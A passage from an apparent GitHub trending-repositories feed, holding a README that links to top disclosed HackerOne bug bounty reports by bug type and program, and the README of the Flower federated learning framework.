    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/reddelexc/hackerone-reports</id>
    <link href="https://github.com/reddelexc/hackerone-reports" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Top disclosed reports from HackerOne&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Tops of HackerOne reports. All reports&#39; raw info stored in &lt;code&gt;data.csv&lt;/code&gt;. Scripts to update this file are written in Python 3 and require &lt;code&gt;chromedriver&lt;/code&gt; and &lt;code&gt;Chromium&lt;/code&gt; executables at &lt;code&gt;PATH&lt;/code&gt;. Every script contains some info about how it works. The run order of scripts:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;code&gt;fetcher.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;uniquer.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;filler.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;rater.py&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Tops 100.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_100/TOP100UPVOTED.md&#34;&gt;Top 100 upvoted reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_100/TOP100PAID.md&#34;&gt;Top 100 paid reports&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Tops by bug type.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPXSS.md&#34;&gt;Top XSS reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPXXE.md&#34;&gt;Top XXE reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPCSRF.md&#34;&gt;Top CSRF reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPIDOR.md&#34;&gt;Top IDOR reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPRCE.md&#34;&gt;Top RCE reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPSQLI.md&#34;&gt;Top SQLi reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPSSRF.md&#34;&gt;Top SSRF reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPRACECONDITION.md&#34;&gt;Top Race Condition reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPSUBDOMAINTAKEOVER.md&#34;&gt;Top Subdomain Takeover reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPOPENREDIRECT.md&#34;&gt;Top Open Redirect reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPCLICKJACKING.md&#34;&gt;Top Clickjacking reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPDOS.md&#34;&gt;Top DoS reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPOAUTH.md&#34;&gt;Top OAuth reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md&#34;&gt;Top Account Takeover reports&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Tops by program.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPMAILRU.md&#34;&gt;Top Mail.ru reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPHACKERONE.md&#34;&gt;Top HackerOne reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPSHOPIFY.md&#34;&gt;Top Shopify reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPNEXTCLOUD.md&#34;&gt;Top Nextcloud reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPTWITTER.md&#34;&gt;Top Twitter reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPUBER.md&#34;&gt;Top Uber reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPNODEJSTHIRDPARTYMODULES.md&#34;&gt;Top Node.js reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPSHOPIFYSCRIPTS.md&#34;&gt;Top shopify-scripts reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPLEGALROBOT.md&#34;&gt;Top Legal Robot reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPUSDEPTOFDEFENSE.md&#34;&gt;Top U.S. Dept of Defense reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPGRATIPAY.md&#34;&gt;Top Gratipay reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPWEBLATE.md&#34;&gt;Top Weblate reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPVKCOM.md&#34;&gt;Top VK.com reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPNEWRELIC.md&#34;&gt;Top New Relic reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPLOCALTAPIOLA.md&#34;&gt;Top LocalTapiola reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPZOMATO.md&#34;&gt;Top Zomato reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPSLACK.md&#34;&gt;Top Slack reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPOWNCLOUD.md&#34;&gt;Top ownCloud reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPGITLAB.md&#34;&gt;Top GitLab reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPUBIQUITIINC.md&#34;&gt;Top Ubiquiti Inc. reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPAUTOMATTIC.md&#34;&gt;Top Automattic reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPCOINBASE.md&#34;&gt;Top Coinbase reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPVERIZONMEDIA.md&#34;&gt;Top Verizon Media reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPSTARBUCKS.md&#34;&gt;Top Starbucks reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPPARAGONINITIATIVEENTERPRISES.md&#34;&gt;Top Paragon Initiative Enterprises reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPPHP(IBB).md&#34;&gt;Top PHP (IBB) reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPBRAVESOFTWARE.md&#34;&gt;Top Brave Software reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPVIMEO.md&#34;&gt;Top Vimeo reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPOLX.md&#34;&gt;Top OLX reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPCONCRETE5.md&#34;&gt;Top concrete5 reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPPHABRICATOR.md&#34;&gt;Top Phabricator reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPPORNHUB.md&#34;&gt;Top Pornhub reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPLOCALIZE.md&#34;&gt;Top Localize reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPQIWI.md&#34;&gt;Top Qiwi reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPWORDPRESS.md&#34;&gt;Top WordPress reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPTHEINTERNET.md&#34;&gt;Top The Internet reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPOPENXCHANGE.md&#34;&gt;Top Open-Xchange reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPRAZER.md&#34;&gt;Top Razer reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPROCKSTARGAMES.md&#34;&gt;Top Rockstar Games reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPGITHUBSECURITYLAB.md&#34;&gt;Top GitHub Security Lab reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPH1CTF.md&#34;&gt;Top h1-ctf reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPVALVE.md&#34;&gt;Top Valve reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPYAHOO!.md&#34;&gt;Top Yahoo! reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPINTERNETBUGBOUNTY.md&#34;&gt;Top Internet Bug Bounty reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPCONCRETECMS.md&#34;&gt;Top Concrete CMS reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPSIFCHAIN.md&#34;&gt;Top Sifchain reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/reddelexc/hackerone-reports/master/tops_by_program/TOPCURL.md&#34;&gt;Top Curl reports&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>adap/flower</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/adap/flower</id>
    <link href="https://github.com/adap/flower" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Flower - A Friendly Federated Learning Framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Flower - A Friendly Federated Learning Framework&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://flower.dev/&#34;&gt; &lt;img src=&#34;https://flower.dev/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2Fflower_white_border.c2012e70.png&amp;amp;w=640&amp;amp;q=75&#34; width=&#34;140px&#34; alt=&#34;Flower Website&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://flower.dev/&#34;&gt;Website&lt;/a&gt; | &lt;a href=&#34;https://flower.dev/blog&#34;&gt;Blog&lt;/a&gt; | &lt;a href=&#34;https://flower.dev/docs/&#34;&gt;Docs&lt;/a&gt; | &lt;a href=&#34;https://flower.dev/conf/flower-summit-2021&#34;&gt;Conference&lt;/a&gt; | &lt;a href=&#34;https://flower.dev/join-slack&#34;&gt;Slack&lt;/a&gt; &lt;br&gt;&lt;br&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/adap/flower/raw/main/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/adap/flower&#34; alt=&#34;GitHub license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/adap/flower/raw/main/CONTRIBUTING.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/PRs-welcome-brightgreen.svg?sanitize=true&#34; alt=&#34;PRs Welcome&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://github.com/adap/flower/workflows/Build/badge.svg?sanitize=true&#34; alt=&#34;Build&#34;&gt; &lt;img src=&#34;https://pepy.tech/badge/flwr&#34; alt=&#34;Downloads&#34;&gt; &lt;a href=&#34;https://flower.dev/join-slack&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Chat-Slack-red&#34; alt=&#34;Slack&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Flower (&lt;code&gt;flwr&lt;/code&gt;) is a framework for building federated learning systems. The design of Flower is based on a few guiding principles:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Customizable&lt;/strong&gt;: Federated learning systems vary wildly from one use case to another. Flower allows for a wide range of different configurations depending on the needs of each individual use case.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Extendable&lt;/strong&gt;: Flower originated from a research project at the Univerity of Oxford, so it was build with AI research in mind. Many components can be extended and overridden to build new state-of-the-art systems.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Framework-agnostic&lt;/strong&gt;: Different machine learning frameworks have different strengths. Flower can be used with any machine learning framework, for example, &lt;a href=&#34;https://pytorch.org&#34;&gt;PyTorch&lt;/a&gt;, &lt;a href=&#34;https://tensorflow.org&#34;&gt;TensorFlow&lt;/a&gt;, &lt;a href=&#34;https://huggingface.co/&#34;&gt;Hugging Face Transformers&lt;/a&gt;, &lt;a href=&#34;https://pytorchlightning.ai/&#34;&gt;PyTorch Lightning&lt;/a&gt;, &lt;a href=&#34;https://mxnet.apache.org/&#34;&gt;MXNet&lt;/a&gt;, &lt;a href=&#34;https://scikit-learn.org/&#34;&gt;scikit-learn&lt;/a&gt;, &lt;a href=&#34;https://jax.readthedocs.io/&#34;&gt;JAX&lt;/a&gt;, &lt;a href=&#34;https://tensorflow.org/lite/&#34;&gt;TFLite&lt;/a&gt;, or even raw &lt;a href=&#34;https://numpy.org/&#34;&gt;NumPy&lt;/a&gt; for users who enjoy computing gradients by hand.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Understandable&lt;/strong&gt;: Flower is written with maintainability in mind. The community is encouraged to both read and contribute to the codebase.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Meet the Flower community on &lt;a href=&#34;https://flower.dev&#34;&gt;flower.dev&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;h2&gt;Federated Learning Tutorial&lt;/h2&gt; &#xA;&lt;p&gt;Flower&#39;s goal is to make federated learning accessible to everyone. This series of tutorials introduces the fundamentals of federated learning and how to implement them in Flower.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;An Introduction to Federated Learning&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://colab.research.google.com/github/adap/flower/blob/main/tutorials/Flower-1-Intro-to-FL-PyTorch.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt; (or open the &lt;a href=&#34;https://github.com/adap/flower/raw/main/tutorials/Flower-1-Intro-to-FL-PyTorch.ipynb&#34;&gt;Jupyter Notebook&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Using Strategies in Federated Learning&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://colab.research.google.com/github/adap/flower/blob/main/tutorials/Flower-2-Strategies-in-FL-PyTorch.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt; (or open the &lt;a href=&#34;https://github.com/adap/flower/raw/main/tutorials/Flower-2-Strategies-in-FL-PyTorch.ipynb&#34;&gt;Jupyter Notebook&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Building Strategies for Federated Learning&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;em&gt;--- coming soon ---&lt;/em&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Privacy and Security in Federated Learning&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;em&gt;--- coming soon ---&lt;/em&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Scaling Federated Learning&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;em&gt;--- coming soon ---&lt;/em&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://flower.dev/docs&#34;&gt;Flower Docs&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/installation.html&#34;&gt;Installation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/quickstart-tensorflow.html&#34;&gt;Quickstart (TensorFlow)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/quickstart-pytorch.html&#34;&gt;Quickstart (PyTorch)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/quickstart-huggingface.html&#34;&gt;Quickstart (Hugging Face [code example])&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/quickstart-pytorch-lightning.html&#34;&gt;Quickstart (PyTorch Lightning [code example])&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flower.dev/docs/example-mxnet-walk-through.html&#34;&gt;Quickstart (MXNet)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/jax_from_centralized_to_federated&#34;&gt;Quickstart (JAX [code example])&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/sklearn-logreg-mnist&#34;&gt;Quickstart (scikit-learn)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/android&#34;&gt;Quickstart (TFLite on Android [code example])&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Flower Baselines&lt;/h2&gt; &#xA;&lt;p&gt;Flower Baselines is a collection of community-contributed experiments that reproduce the experiments performed in popular federated learning publications. Researchers can build on Flower Baselines to quickly evaluate new ideas:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/2102.07623.pdf&#34;&gt;FedBN: Federated Learning on non-IID Features via Local Batch Normalization&lt;/a&gt;: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/baselines/flwr_baselines/publications/fedbn/convergence_rate&#34;&gt;Convergence Rate&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/2003.00295.pdf&#34;&gt;Adaptive Federated Optimization&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/baselines/flwr_baselines/publications/adaptive_federated_optimization&#34;&gt;CIFAR-10/100&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Check the Flower documentation to learn more: &lt;a href=&#34;https://flower.dev/docs/using-baselines.html&#34;&gt;Using Baselines&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The Flower community loves contributions! Make your work more visible and enable others to build on it by contributing it as a baseline: &lt;a href=&#34;https://flower.dev/docs/contributing-baselines.html&#34;&gt;Contributing Baselines&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Flower Usage Examples&lt;/h2&gt; &#xA;&lt;p&gt;A number of examples show different usage scenarios of Flower (in combination with popular machine learning frameworks such as PyTorch or TensorFlow). To run an example, first install the necessary extras:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://flower.dev/docs/examples.html&#34;&gt;Usage Examples Documentation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Quickstart examples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/quickstart_tensorflow&#34;&gt;Quickstart (TensorFlow)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/quickstart_pytorch&#34;&gt;Quickstart (PyTorch)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/quickstart_huggingface&#34;&gt;Quickstart (Hugging Face)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/quickstart_pytorch_lightning&#34;&gt;Quickstart (PyTorch Lightning)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/quickstart_mxnet&#34;&gt;Quickstart (MXNet)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/sklearn-logreg-mnist&#34;&gt;Quickstart (scikit-learn)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/android&#34;&gt;Quickstart (TFLite on Android)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Other &lt;a href=&#34;https://github.com/adap/flower/tree/main/examples&#34;&gt;examples&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/embedded_devices&#34;&gt;Raspberry Pi &amp;amp; Nvidia Jetson Tutorial&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/android&#34;&gt;Android &amp;amp; TFLite&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/pytorch_from_centralized_to_federated&#34;&gt;PyTorch: From Centralized to Federated&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/mxnet_from_centralized_to_federated&#34;&gt;MXNet: From Centralized to Federated&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/jax_from_centralized_to_federated&#34;&gt;JAX: From Centralized to Federated&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/advanced_tensorflow&#34;&gt;Advanced Flower with TensorFlow/Keras&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/advanced_pytorch&#34;&gt;Advanced Flower with PyTorch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/adap/flower/tree/main/examples/simulation&#34;&gt;Single-Machine Simulation of Federated Learning Systems&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;Flower is built by a wonderful community of researchers and engineers. &lt;a href=&#34;https://flower.dev/join-slack&#34;&gt;Join Slack&lt;/a&gt; to meet them, &lt;a href=&#34;https://raw.githubusercontent.com/adap/flower/main/#contributing-to-flower&#34;&gt;contributions&lt;/a&gt; are welcome.&lt;/p&gt; 